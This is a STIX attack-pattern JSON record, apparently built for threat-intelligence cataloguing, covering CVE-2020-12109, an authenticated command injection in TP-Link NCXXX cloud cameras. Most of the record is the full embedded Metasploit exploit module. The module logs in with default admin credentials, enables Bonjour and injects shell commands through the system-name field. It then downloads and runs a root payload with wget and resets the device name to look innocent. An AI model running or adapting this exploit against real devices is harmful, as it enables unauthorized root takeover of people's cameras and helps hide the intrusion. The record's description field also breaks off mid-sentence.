{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--499cb2e1-048a-4e51-b21f-0aee7da4715e",
    "created": "2024-08-14T17:00:08.686416Z",
    "modified": "2024-08-14T17:00:08.68642Z",
    "name": "TP-Link Cloud Cameras NCXXX Bonjour Command Injection",
    "description": " TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230 NC250, NC260, NC450) are vulnerable to an authenticated command injection. In all devices except NC210, despite a check on the name length in swSystemSetProductAliasCheck, no other checks are in place in order to prevent shell metacharacters from being introduced. The system name would then be used in swBonjourStartHTTP as part of a shell command where arbitrary commands could be injected and executed as root. NC210 devices cannot be exploited directly via /setsysname.cgi due to proper input validation. NC210 devices are still vulnerable since swBonjourStartHTTP did not perform any validation when reading the alias name from the configuration file. The configuration file can be written, and code",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/tp_link_ncxxx_bonjour_command_injection.rb",
            "external_id": "tp_link_ncxxx_bonjour_command_injection.rb"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-12109"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2020/May/2"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12109"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TP-Link Cloud Cameras NCXXX Bonjour Command Injection',\n        'Description' => %q{\n          TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230,\n          NC250, NC260, NC450) are vulnerable to an authenticated command\n          injection. In all devices except NC210, despite a check on the name length in\n          swSystemSetProductAliasCheck, no other checks are in place in order\n          to prevent shell metacharacters from being introduced. The system name\n          would then be used in swBonjourStartHTTP as part of a shell command\n          where arbitrary commands could be injected and executed as root. NC210 devices\n          cannot be exploited directly via /setsysname.cgi due to proper input\n          validation. NC210 devices are still vulnerable since swBonjourStartHTTP\n          did not perform any validation when reading the alias name from the\n          configuration file. The configuration file can be written, and code\n          execution can be achieved by combining this issue with CVE-2020-12110.\n        },\n        'Author' => ['Pietro Oliva <pietroliva[at]gmail.com>'],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-12109' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2020/May/2' ],\n          [ 'CVE', '2020-12109']\n        ],\n        'DisclosureDate' => '2020-04-29',\n        'Platform' => 'linux',\n        'Arch' => ARCH_MIPSLE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'Targets' => [\n          [\n            'TP-Link NC200, NC220, NC230, NC250',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'Platform' => 'linux',\n              'CmdStagerFlavor' => [ 'wget' ]\n            }\n          ],\n          [\n            'TP-Link NC260, NC450',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'Platform' => 'linux',\n              'CmdStagerFlavor' => [ 'wget' ],\n              'DefaultOptions' => { 'SSL' => true }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'The web interface username', 'admin' ]),\n        OptString.new('PASSWORD', [ true, 'The web interface password for the specified username', 'admin' ])\n      ]\n    )\n  end\n\n  def login\n    user = datastore['USERNAME']\n    pass = Base64.strict_encode64(datastore['PASSWORD'])\n    if target.name == 'TP-Link NC260, NC450'\n      pass = Rex::Text.md5(pass)\n    end\n\n    print_status(\"Authenticating with #{user}:#{pass} ...\")\n    begin\n      res = send_request_cgi({\n        'uri' => '/login.fcgi',\n        'method' => 'POST',\n        'vars_post' => {\n          'Username' => user,\n          'Password' => pass\n        }\n      })\n      if res.nil? || res.code == 404\n        fail_with(Failure::NoAccess, '/login.fcgi did not reply correctly. Wrong target ip?')\n      end\n      if res.body =~ /\"errorCode\":0/ && res.headers.key?('Set-Cookie') && res.body =~ /token/\n        print_good(\"Logged-in as #{user}\")\n        @cookie = res.get_cookies.scan(/\\s?([^, ;]+?)=([^, ;]*?)[;,]/)[0][1]\n        print_good(\"Got cookie: #{@cookie}\")\n        @token = res.body.scan(/\"(token)\":\"([^,\"]*)\"/)[0][1]\n        print_good(\"Got token: #{@token}\")\n      else\n        fail_with(Failure::NoAccess, \"Login failed with #{user}:#{pass}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n  end\n\n  def enable_bonjour\n    res = send_request_cgi({\n      'uri' => '/setbonjoursetting.fcgi',\n      'method' => 'POST',\n      'encode_params' => false,\n      'cookie' => \"sess=#{@cookie}\",\n      'vars_post' => {\n        'bonjourState' => '1',\n        'token' => @token.to_s\n      }\n    })\n    return res\n  rescue ::Rex::ConnectionError\n    vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\")\n    return nil\n  end\n\n  def sys_name(cmd)\n    res = send_request_cgi({\n      'uri' => '/setsysname.fcgi',\n      'method' => 'POST',\n      'encode_params' => true,\n      'cookie' => \"sess=#{@cookie}\",\n      'vars_post' => {\n        'sysname' => cmd,\n        'token' => @token.to_s\n      }\n    })\n    return res\n  rescue ::Rex::ConnectionError\n    vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\")\n    return nil\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status(\"Executing command: #{cmd}\")\n    sys_name(\"$(#{cmd})\")\n  end\n\n  def exploit\n    login # Get cookie and csrf token\n    enable_bonjour # Enable bonjour service\n    execute_cmdstager # Upload and execute payload\n    sys_name('NC200') # Set back an innocent-looking device name\n  end\n\nend\n",
    "x_mitre_contributors": [
        "[Pietro Oliva <pietroliva[at]gmail.com>]",
        ""
    ],
    "x_mitre_disclosure_date": "2020-04-29",
    "x_mitre_platforms": [
        "linux'"
    ]
}